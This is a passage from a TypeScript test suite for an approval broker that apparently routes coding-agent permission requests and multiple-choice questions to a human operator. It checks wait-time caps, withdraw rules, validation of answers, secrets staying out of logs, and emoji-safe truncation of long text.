    await withdraw(b, s, row.id, "wrong");
    expect(JSON.stringify(list.body)).not.toContain(row.secret);
    expect(JSON.stringify(waited.body)).not.toContain(row.secret);
    expect(JSON.stringify(waited.body)).not.toContain("producer_secret");
    await Bun.sleep(200);
    expect(readFileSync(join(b.tmpDir, "logs", "broker.log"), "utf8")).not.toContain(row.secret);
  });

  test("approvalWaitTimeoutSec caps a hook row at 30 s and leaves other routes on the general ceiling", () => {
    expect(approvalWaitTimeoutSec(300, "hook"), "a 300 s park would keep a dead CLI's row looking alive").toBe(30);
    expect(approvalWaitTimeoutSec(25, "hook")).toBe(25);
    expect(approvalWaitTimeoutSec(Number.NaN, "hook")).toBe(30);
    expect(approvalWaitTimeoutSec(undefined, "hook")).toBe(30);
    expect(approvalWaitTimeoutSec("300", "hook")).toBe(30);
    expect(approvalWaitTimeoutSec(-5, "hook")).toBe(1);
    expect(approvalWaitTimeoutSec(300, "pty")).toBe(300);
    expect(approvalWaitTimeoutSec(300, "channel")).toBe(300);
    expect(approvalWaitTimeoutSec(1_000, "pty")).toBe(300);
    expect(approvalWaitTimeoutSec(Number.NaN, "pty")).toBe(30);
  });

  test("/approval/wait parks a hook row for the capped duration, not the one asked", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);

    const started = Date.now();
    expect((await wait(b, s, row.id, 1, row.secret)).body.pending).toBe(true);
    expect(Date.now() - started).toBeLessThan(5_000);

    const parked = wait(b, s, row.id, 300, row.secret);
    await Bun.sleep(150);
    await claimAllow(b, op, row.id);
    expect((await parked).body.approval?.answer_kind).toBe("allow");
    const logPath = join(b.tmpDir, "logs", "broker.log");
    const deadline = Date.now() + 2000;
    let capped = false;
    while (!capped && Date.now() < deadline) {
      capped = readFileSync(logPath, "utf8").includes(`approval ${row.id}: wait capped at 30 s (asked 300 s)`);
      if (!capped) await Bun.sleep(50);
    }
    expect(capped, "the handler must park for approvalWaitTimeoutSec's value").toBe(true);
  });

  test("a session may withdraw only a hook-route row", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const ptyGuarded = (await raise(b, s, "window-hook", { reply_route: "pty", merge: "never" })).body.approval;
    expect(ptyGuarded.mergeable).toBe(false);
    const res = await withdraw(b, s, ptyGuarded.id);
    expect(res.status, "another tile's ask_operator ticket is not this session's to close").toBe(422);
    expect((await listed(b, op, ptyGuarded.id))?.status).toBe("pending");
  });

  test("settleApproval, the body every gateway answer runs through, refuses an orphan hook row as session-gone", async () => {
    // broker.ts starts a server on import, so the real function body is cut
    // out and evaluated against an in-memory table. onAnswer hands this exact
    // value to channelAnswerResult, which keeps `refused` for the phone.
    const src = readFileSync(join(import.meta.dir, "..", "broker.ts"), "utf8").replace(/\r\n/g, "\n");
    const cut = (anchor: string): string => {
      const start = src.indexOf(anchor);
      const end = src.indexOf("\n}\n", start);
      expect(start, `${anchor} not found in broker.ts`).toBeGreaterThan(-1);
      expect(end).toBeGreaterThan(start);
      return src.slice(start, end + 2);
    };
    const dir = realpathSync.native(mkdtempSync(join(tmpdir(), "kory-settle-")));
    const file = join(dir, "settle.ts");
    writeFileSync(
      file,
      `export function register(env) {\n` +
        `  const { db, approvalWhere, hookProducerGone, hookPermissionDeadlineElapsed, rowToApproval, notifyRegistry, log, deliverApprovalAnswer, resolveApprovalWaiters } = env;\n` +
        `${cut("function abandonIfHookProducerGone(")}\n${cut("function settleApproval(")}\n  return settleApproval;\n}\n`
    );
    const { register } = (await import(pathToFileURL(file).href)) as {
      register: (env: Record<string, unknown>) => (...args: unknown[]) => Record<string, unknown>;
    };
    const db = new Database(":memory:");
    db.run("CREATE TABLE pending_approvals (id TEXT, status TEXT, answered_at TEXT)");
    db.run("INSERT INTO pending_approvals VALUES ('orphan', 'pending', NULL)");
    const settle = register({
      db,
      approvalWhere: () => ({ sql: "1 = 1", params: [] }),
      hookProducerGone: () => true,
      hookPermissionDeadlineElapsed: () => false,
      rowToApproval: (r: unknown) => r,
      notifyRegistry: { settle: async () => {} },
      log: { info: () => {}, error: () => {} },
      deliverApprovalAnswer: () => {
        throw new Error("an orphan row must never be delivered");
      },
      resolveApprovalWaiters: () => {},
    });

    const res = settle("orphan", {}, "telegram", "allow", null, "answered");
    expect(res.status).toBe(410);
    expect(res.refused, "without it the phone reads 'already handled' instead of why").toBe("session-gone");
    const row = db.query("SELECT status FROM pending_approvals WHERE id = 'orphan'").get() as { status: string };
    expect(row.status).toBe("abandoned");
    db.close();
  });

  test("a hook row whose notification expired is still parked by wait and closed by withdraw", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET status = 'expired_notif' WHERE id = ?", [row.id]);
    db.close();

    const started = Date.now();
    const waited = await wait(b, s, row.id, 1, row.secret);
    expect(waited.body.pending, "an immediate return would make the module respawn its helper in a loop").toBe(true);
    expect(Date.now() - started).toBeGreaterThanOrEqual(900);

    const res = await withdraw(b, s, row.id, row.secret);
    expect(res.status, res.body.error).toBe(200);
    expect(res.body.approval?.status).toBe("answered_terminal");
  });

  test("a malformed claim on a hook row whose module stopped waiting is refused without closing the row", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const row = await hook(b, s);
    age(b, row.id, 46_000);

    const res = await signedPost<{ error?: string }>(
      b, "/approval/claim", { id: row.id, via: "deck", answer_kind: "maybe" }, { cred: op.cred, operator_id: op.id }
    );
    expect(res.status).toBe(400);
    // Read straight from the table: /approval/list would itself close the orphan.
    const db = new Database(b.dbPath);
    const stored = db.query("SELECT status FROM pending_approvals WHERE id = ?").get(row.id) as { status: string };
    db.close();
    expect(stored.status).toBe("pending");
  });

  test("last_wait_at is stamped when a wait ENDS, by timeout or by an answer, not only when it starts", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const stampOf = (id: string): number => {
      const db = new Database(b.dbPath);
      const r = db.query("SELECT last_wait_at FROM pending_approvals WHERE id = ?").get(id) as { last_wait_at: string };
      db.close();
      return Date.parse(r.last_wait_at);
    };

    const expiring = await hook(b, s);
    const t0 = Date.now();
    expect((await wait(b, s, expiring.id, 1, expiring.secret)).body.pending).toBe(true);
    expect(stampOf(expiring.id) - t0, "the window must count from the end of a 30 s wait, not its start").toBeGreaterThanOrEqual(900);

    const answered = await hook(b, s);
    const t1 = Date.now();
    const parked = wait(b, s, answered.id, 20, answered.secret);
    await Bun.sleep(400);
    await claimAllow(b, op, answered.id);
    await parked;
    expect(stampOf(answered.id) - t1).toBeGreaterThanOrEqual(350);
  });

  test("/approval/list closes a hook row whose module stopped waiting, and only that one", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");
    const pendingIds = async (): Promise<string[]> => {
      const res = await signedPost<{ approvals: Approval[] }>(
        b, "/approval/list", { ...approvalListBody(DEFAULT_PROJECT_KEY), status: "pending" }, { cred: op.cred, operator_id: op.id }
      );
      return res.body.approvals.map((a) => a.id);
    };

    const orphan = await hook(b, s);
    age(b, orphan.id, 46_000);
    const recent = await hook(b, s);
    await wait(b, s, recent.id, 1, recent.secret);
    const parkedRow = await hook(b, s);
    const parked = wait(b, s, parkedRow.id, 20, parkedRow.secret);
    await Bun.sleep(100);
    age(b, parkedRow.id, 46_000);
    const ptyRow = await addApproval(b, op);
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET created_at = ? WHERE id = ?", [new Date(Date.now() - 46_000).toISOString(), ptyRow.id]);
    db.close();

    const ids = await pendingIds();
    expect(ids, "a module that stopped waiting must not keep the tile flagged").not.toContain(orphan.id);
    expect(ids).toEqual(expect.arrayContaining([recent.id, parkedRow.id, ptyRow.id]));
    expect((await listed(b, op, orphan.id))?.status).toBe("abandoned");

    await withdraw(b, s, parkedRow.id, parkedRow.secret);
    await parked;
  });

  test("a claim on a hook row with a recent wait, or a wait still parked, is settled", async () => {
    const b = await boot();
    const op = newOperator();
    const s = await session(b, op, "window-hook");

    const recent = await hook(b, s);
    await wait(b, s, recent.id, 1, recent.secret);
    expect((await claimAllow(b, op, recent.id)).status).toBe(200);

    const parkedRow = await hook(b, s);
    const parked = wait(b, s, parkedRow.id, 20, parkedRow.secret);
    await Bun.sleep(100);
    age(b, parkedRow.id, 60_000);
    const claimed = await claimAllow(b, op, parkedRow.id);
    expect(claimed.status, "a long wait in flight is the module being alive").toBe(200);
    expect((await parked).body.approval?.answer_kind).toBe("allow");
  });
});

describe("AskUserQuestion: questions on add, answers on claim", () => {
  type Op = { cred: ApprovalCredential; id: string };
  const questions = [
    { question: "Pick fruits?", header: "Fruit", options: [{ label: "Apple" }, { label: "Cherry" }], multi_select: true },
    { question: "Which colour?", header: "Colour", options: [{ label: "Red" }, { label: "Blue" }] },
  ];
  const asOp = (op: Op) => ({ cred: op.cred, operator_id: op.id });
  const claimAnswers = (b: TestBroker, op: Op, id: string, extra: Record<string, unknown>) =>
    signedPost<{ approval?: Approval; error?: string }>(b, "/approval/claim", { id, via: "deck", ...extra }, asOp(op));
  const raiseQuestions = (b: TestBroker, op: Op, over: Record<string, unknown> = {}) =>
    addApproval(b, op, {
      kind: "question",
      title: "Questions",
      question: "Two questions",
      options: [],
      questions,
      reply_route: "hook",
      merge: "never",
      ...over,
    });

  test("the questions are stored and read back; an answers claim stores arrays and a summary", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op);
    expect(row.questions?.map((q) => [q.question, q.multi_select, q.options.map((o) => o.label)])).toEqual([
      ["Pick fruits?", true, ["Apple", "Cherry"]],
      ["Which colour?", false, ["Red", "Blue"]],
    ]);
    expect(row.answers).toBeNull();

    const res = await claimAnswers(b, op, row.id, {
      answer_kind: "answers",
      answers: { "Pick fruits?": ["Cherry", "Apple"], "Which colour?": ["Green"] },
    });
    expect(res.status, res.body.error).toBe(200);
    expect(res.body.approval?.answer_kind).toBe("answers");
    expect(res.body.approval?.answers).toEqual({ "Pick fruits?": ["Apple", "Cherry"], "Which colour?": ["Green"] });
    expect(res.body.approval?.answer_text).toBe("Pick fruits?: Apple, Cherry\nWhich colour?: Green");
    const listed = await signedPost<{ approvals: Approval[] }>(b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), asOp(op));
    expect(listed.body.approvals.find((a) => a.id === row.id)?.answers).toEqual(res.body.approval?.answers);
  });

  test("add refuses malformed questions with 400", async () => {
    const b = await boot();
    const op = newOperator();
    const bad = [
      { questions: [questions[0], { ...questions[0], header: "dup" }] },
      { questions: "Pick fruits?" },
      { questions, kind: "permission" },
    ];
    for (const over of bad) {
      const res = await signedPost<{ error?: string }>(
        b,
        "/approval/add",
        { kind: "question", title: "t", question: "q", origin: { project_key: DEFAULT_PROJECT_KEY }, ...over },
        asOp(op)
      );
      expect(res.status, JSON.stringify(over)).toBe(400);
    }
  });

  test("an answers claim is refused where it cannot reach anyone, or does not match the questions", async () => {
    const b = await boot();
    const op = newOperator();
    const plain = await addApproval(b, op, { kind: "question", title: "t", question: "q", reply_route: "hook", merge: "never" });
    const noQuestions = await claimAnswers(b, op, plain.id, { answer_kind: "answers", answers: { "q": ["x"] } });
    expect(noQuestions.status, "answers on a row without questions").toBe(422);

    const row = await raiseQuestions(b, op);
    const bad: Array<Record<string, unknown>> = [
      { answer_kind: "answers", answers: { "Pick fruits?": ["Apple"], "Which colour?": ["Red"], "Rogue?": ["x"] } },
      { answer_kind: "answers", answers: { "Pick fruits?": ["Apple"] } },
      { answer_kind: "answers", answers: { "Pick fruits?": "Apple", "Which colour?": ["Red"] } },
      { answer_kind: "answers", answers: { "Pick fruits?": ["Apple"], "Which colour?": ["Red", "Blue"] } },
      { answer_kind: "answers" },
      { answer_kind: "text", answer_text: "hi", answers: { "Pick fruits?": ["Apple"], "Which colour?": ["Red"] } },
      { answer_kind: "answers", answer_text: "hi", answers: { "Pick fruits?": ["Apple"], "Which colour?": ["Red"] } },
    ];
    for (const extra of bad) {
      expect((await claimAnswers(b, op, row.id, extra)).status, JSON.stringify(extra)).toBe(400);
    }
    const still = await signedPost<{ approvals: Approval[] }>(b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), asOp(op));
    expect(still.body.approvals.find((a) => a.id === row.id)?.status, "a refused answer settles nothing").toBe("pending");
  });

  test("questions are refused at add unless a hook or channel route and merge never can carry the answers back", async () => {
    const b = await boot();
    const op = newOperator();
    const add = (over: Record<string, unknown>) =>
      signedPost<{ error?: string }>(
        b,
        "/approval/add",
        { kind: "question", title: "t", question: "q", questions, origin: { project_key: DEFAULT_PROJECT_KEY }, ...over },
        asOp(op)
      );
    expect((await add({ reply_route: "pty", merge: "never" })).status, "nothing can type answers into a terminal").toBe(400);
    expect((await add({ merge: "never" })).status, "the default route is pty").toBe(400);
    const downgraded = await add({ reply_route: "channel", reply_peer_id: "nobody-here", merge: "never" });
    expect(downgraded.status, "a channel route whose peer is gone falls back to pty").toBe(400);
    expect((await add({ reply_route: "channel", merge: "tile" })).status, "a mergeable row could be absorbed").toBe(400);
  });

  test("an absorbed question takes no answers verdict", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op);
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET absorbed_permission = 1 WHERE id = ?", [row.id]);
    db.close();
    const res = await claimAnswers(b, op, row.id, {
      answer_kind: "answers",
      answers: { "Pick fruits?": ["Apple"], "Which colour?": ["Red"] },
    });
    expect(res.status).toBe(422);
    const listed = await signedPost<{ approvals: Approval[] }>(b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), asOp(op));
    expect(listed.body.approvals.find((a) => a.id === row.id)?.status).toBe("pending");
  });

  test("a hook question row refuses allow, deny and text with answers-only, and stays pending", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op);
    const verdicts: Array<Record<string, unknown>> = [
      { answer_kind: "allow" },
      { answer_kind: "deny" },
      { answer_kind: "text", answer_text: "Red" },
    ];
    for (const extra of verdicts) {
      const res = await claimAnswers(b, op, row.id, extra);
      expect(res.status, JSON.stringify(extra)).toBe(422);
      expect(res.body.error, JSON.stringify(extra)).toContain("answer_kind answers");
    }
    const still = await signedPost<{ approvals: Approval[] }>(b, "/approval/list", approvalListBody(DEFAULT_PROJECT_KEY), asOp(op));
    expect(still.body.approvals.find((a) => a.id === row.id)?.status, "a refused verdict settles nothing").toBe("pending");
  });

  test("a hook question row can still be handed back to the terminal", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op);
    const res = await claimAnswers(b, op, row.id, { handback: true });
    expect(res.status, res.body.error).toBe(200);
    expect([res.body.approval?.status, res.body.approval?.answer_kind]).toEqual(["answered_terminal", null]);
  });

  test("a question row no module waits on still takes a text answer", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op);
    const db = new Database(b.dbPath);
    db.run("UPDATE pending_approvals SET reply_route = 'pty' WHERE id = ?", [row.id]);
    db.close();
    const res = await claimAnswers(b, op, row.id, { answer_kind: "text", answer_text: "Red" });
    expect(res.status, res.body.error).toBe(200);
    expect(res.body.approval?.answer_kind).toBe("text");
  });

  test("questions named like Object.prototype members survive the round trip", async () => {
    const b = await boot();
    const op = newOperator();
    const row = await raiseQuestions(b, op, {
      questions: ["__proto__", "constructor"].map((question) => ({ question, options: [{ label: "A" }, { label: "B" }] })),
    });
    const res = await claimAnswers(b, op, row.id, { answer_kind: "answers", answers: JSON.parse('{"__proto__":["A"],"constructor":["B"]}') });
    expect(res.status, res.body.error).toBe(200);
    expect(Object.keys(res.body.approval?.answers ?? {})).toEqual(["__proto__", "constructor"]);
  });
});

describe("over-long title and question are cut visibly", () => {
  const EMOJI = String.fromCodePoint(0x1f600);
  const codePoints = (s: string): number => Array.from(s).length;
  const loneSurrogate = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/;

  test("a 5000-character question is stored with a marker naming its original length, within 4000", async () => {
    const b = await boot();
    const row = await addApproval(b, newOperator(), { question: "q".repeat(5000) });
    expect(row.question.endsWith("[truncated from 5000 characters]"), row.question.slice(-60)).toBe(true);
    expect(codePoints(row.question)).toBeLessThanOrEqual(4000);
    expect(row.question.startsWith("q".repeat(3900))).toBe(true);
  });

  test("a question of exactly 4000 code points is stored intact, an astral one included", async () => {
    const b = await boot();
    const question = `${"a".repeat(3998)}${EMOJI}b`;
    expect(codePoints(question)).toBe(4000);
    const row = await addApproval(b, newOperator(), { question });
    expect(row.question).toBe(question);
  });

  test("an emoji at the cut position is never split", async () => {
    const b = await boot();
    const row = await addApproval(b, newOperator(), { question: EMOJI.repeat(4100) });
    expect(loneSurrogate.test(row.question), "a lone surrogate reached the stored question").toBe(false);
    expect(row.question, "a split pair stored as UTF-8 comes back as the replacement character").not.toContain(String.fromCharCode(0xfffd));
    const marker = ` ${String.fromCharCode(0x2026)} [truncated from 4100 characters]`;
    expect(row.question, "a split pair can also come back fused with the next character").toBe(
      EMOJI.repeat(4000 - marker.length) + marker
    );
    expect(row.question).toContain("[truncated from 4100 characters]");
    expect(codePoints(row.question)).toBeLessThanOrEqual(4000);
  });

  test("capVisibly never leaves a lone surrogate, whatever the parity of the cut", () => {
    for (const s of [EMOJI.repeat(4100), `a${EMOJI.repeat(4100)}`]) {
      const cut = capVisibly(s, 4000);
      expect(loneSurrogate.test(cut), `offset ${s.length % 2}`).toBe(false);
      expect(cut).toContain(`[truncated from ${codePoints(s)} characters]`);
      expect(codePoints(cut)).toBeLessThanOrEqual(4000);
    }
  });

  test("capVisibly stays within a bound too small for the marker", () => {
    expect(capVisibly("x".repeat(50), 10)).toBe("x".repeat(10));
    expect(capVisibly("x".repeat(50), 0)).toBe("");
    expect(capVisibly("x".repeat(50), -5)).toBe("");
  });

  test("an over-long title carries the same marker within 200", async () => {
    const b = await boot();
    const row = await addApproval(b, newOperator(), { title: `${EMOJI}${"t".repeat(300)}` });
    expect(row.title.endsWith("[truncated from 301 characters]"), row.title).toBe(true);
    expect(codePoints(row.title)).toBeLessThanOrEqual(200);
    expect(row.title.startsWith(EMOJI)).toBe(true);
  });
});
